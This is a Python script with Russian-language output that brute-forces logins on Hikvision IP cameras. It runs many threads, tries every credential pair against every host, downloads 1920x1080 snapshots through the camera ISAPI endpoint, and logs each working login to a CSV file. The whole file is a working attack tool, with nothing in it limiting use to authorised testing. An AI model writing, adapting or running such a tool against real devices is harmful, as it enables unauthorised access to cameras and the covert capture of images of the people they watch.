import requests
from requests.auth import HTTPBasicAuth
import os
from datetime import datetime
import concurrent.futures
import threading
import argparse
import csv
from itertools import product

print_lock = threading.Lock()
csv_lock = threading.Lock()

def safe_print(message):
    with print_lock:
        print(message)

def init_argparse():
    parser = argparse.ArgumentParser(description='Скрипт для работы с IP-камерами Hikvision', usage='%(prog)s <mode> [options]')
    subparsers = parser.add_subparsers(dest='mode', required=True)

    snapshot_parser = subparsers.add_parser('snapshot', help='Режим готовых комбинаций')
    snapshot_parser.add_argument('-f', '--file', required=True, help='Файл с комбинациями в формате ip,port,login,password')

    brute_parser = subparsers.add_parser('web_brute', help='Режим перебора комбинаций')
    brute_parser.add_argument('-c', '--credentials', required=True, help='Файл с учетными данными в формате login:password')
    brute_parser.add_argument('-i', '--hosts', required=True, help='Файл с хостами в формате ip:port')

    return parser.parse_args()

def download_snapshot(ip, port, login, password, csv_writer):
    try:
        url = f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture?videoResolutionWidth=1920&videoResolutionHeight=1080"
        filename = f"{ip}_{port}_{login}_{password}.jpg".replace(':', '_').replace('/', '_')
        filepath = os.path.join(save_dir, filename)

        safe_print(f"Попытка подключения к {ip}:{port}...")

        response = requests.get(url, auth=HTTPBasicAuth(login, password), timeout=10, stream=True)

        if response.status_code == 200:
            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)

            with csv_lock:
                csv_writer.writerow([ip, port, login, password])

            safe_print(f"[УСПЕХ] {ip}:{port} - изображение сохранено")
            return True

        safe_print(f"[ОШИБКА] {ip}:{port} - код {response.status_code}")
        return False

    except Exception as e:
        safe_print(f"[ОШИБКА] {ip}:{port} - {str(e)}")
        return False

def read_combinations_file(filename):
    with open(filename, 'r') as f:
        return [line.strip().split(',') for line in f if line.strip()]

def read_pairs_file(filename, delimiter=':'):
    with open(filename, 'r') as f:
        return [line.strip().split(delimiter) for line in f if line.strip()]

def run_snapshot_mode(input_file):
    combinations = read_combinations_file(input_file)
    safe_print(f"Найдено {len(combinations)} комбинаций для проверки...")

    csv_filename = os.path.join(save_dir, f"results_{today}.csv")
    with open(csv_filename, 'w', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        csv_writer.writerow(['IP', 'Port', 'Login', 'Password'])

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for combo in combinations:
                if len(combo) == 4:
                    ip, port, login, password = combo
                    futures.append(executor.submit(download_snapshot, ip, port, login, password, csv_writer))

            success_count = sum(f.result() for f in concurrent.futures.as_completed(futures))

    safe_print(f"\nУспешно: {success_count}")
    safe_print(f"Ошибки: {len(combinations) - success_count}")

def run_brute_mode(creds_file, hosts_file):
    credentials = read_pairs_file(creds_file)
    hosts = read_pairs_file(hosts_file)
    total_combinations = len(credentials) * len(hosts)

    safe_print(f"Найдено {len(credentials)} учетных записей и {len(hosts)} хостов")
    safe_print(f"Всего комбинаций для проверки: {total_combinations}")

    csv_filename = os.path.join(save_dir, f"results_{today}.csv")
    with open(csv_filename, 'w', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        csv_writer.writerow(['IP', 'Port', 'Login', 'Password'])

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for (login, password), (ip, port) in product(credentials, hosts):
                futures.append(executor.submit(download_snapshot, ip, port, login, password, csv_writer))

            success_count = sum(f.result() for f in concurrent.futures.as_completed(futures))

    safe_print(f"\nУспешно: {success_count}")
    safe_print(f"Ошибки: {total_combinations - success_count}")

if __name__ == "__main__":
    args = init_argparse()
    today = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    save_dir = f"Snapshots_{today}"
    os.makedirs(save_dir, exist_ok=True)

    try:
        if args.mode == 'snapshot':
            if not os.path.exists(args.file):
                safe_print(f"Ошибка: файл {args.file} не найден!")
                exit(1)
            run_snapshot_mode(args.file)
        elif args.mode == 'web_brute':
            if not all([os.path.exists(args.credentials), os.path.exists(args.hosts)]):
                safe_print("Ошибка: один или оба файла не существуют!")
                exit(1)
            run_brute_mode(args.credentials, args.hosts)
    except KeyboardInterrupt:
        safe_print("\nСканирование прервано пользователем")
        exit(0)
    except Exception as e:
        safe_print(f"Критическая ошибка: {str(e)}")
        exit(1)
